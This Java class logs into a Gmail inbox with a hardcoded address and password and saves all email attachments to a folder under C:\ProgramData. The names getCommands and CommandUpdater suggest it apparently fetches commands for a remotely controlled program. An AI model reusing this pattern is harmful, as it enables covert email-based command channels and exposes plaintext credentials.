package getCommands;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

import javax.mail.BodyPart;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Part;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Store;

import org.apache.commons.lang3.StringUtils;


public class CommandUpdater {
	static String from = "obondanielspam@gmail.com";
	static String username = from;
	static String password = "spammymail";
	
	public static final String root = "C:\\ProgramData\\recieve";
	
	static String host = "smtp.gmail.com";
	static String port = "995"; 

	public void createRoot(){
		new File(root).mkdirs();
	}
	
   public void updateCommands() {

      Properties props = new Properties();
      props.put("mail.smtp.host", host);
      props.put("mail.smtp.port", port);
      props.put("mail.smtp.starttls.enable", "true");
      
      // Get the Session object.
      Session session = Session.getInstance(props,
         new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
               return new PasswordAuthentication(username, password);
	   }
         });

      try {
          //create the POP3 store object and connect with the pop server
          Store store = session.getStore("pop3s");
          store.connect(host, username, password);
          
          Folder emailFolder = store.getFolder("INBOX");
          emailFolder.open(Folder.READ_ONLY);
          
          // retrieve the messages from the folder in an array and print it
          Message[] messages = emailFolder.getMessages();
          // messages[i].setFlag(Flags.Flag.SEEN, false);
          
          List<File> attachments = new ArrayList<File>();
          for (int j = 0, n = messages.length; j < n; j++) {
        	  Message message = messages[j];
              Multipart multipart = (Multipart) message.getContent();
              // System.out.println(multipart.getCount());

              for (int i = 0; i < multipart.getCount(); i++) {
                  BodyPart bodyPart = multipart.getBodyPart(i);
                  if(!Part.ATTACHMENT.equalsIgnoreCase(bodyPart.getDisposition()) &&
                         !StringUtils.isNotBlank(bodyPart.getFileName())) {
                      continue; // dealing with attachments only
                  } 
                  InputStream is = bodyPart.getInputStream();
                  File f = new File( root + "\\" + bodyPart.getFileName());
                  FileOutputStream fos = new FileOutputStream(f);
                  byte[] buf = new byte[4096];
                  int bytesRead;
                  while((bytesRead = is.read(buf))!=-1) {
                      fos.write(buf, 0, bytesRead);
                  }
                  fos.close();
                  // printFile(root + bodyPart.getFileName());
                  
                  attachments.add(f);
              }
          }

          //close the store and folder objects
          emailFolder.close(false);
          store.close(); 
          
      } catch (MessagingException | IOException e) {
         throw new RuntimeException(e);
      }
   }
   
	public void printFile(String path){
		BufferedReader br;
		try {
			br = new BufferedReader(new FileReader(path));
			 String line = null;
			 while ((line = br.readLine()) != null) {
			   System.out.println(line);
			 }
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}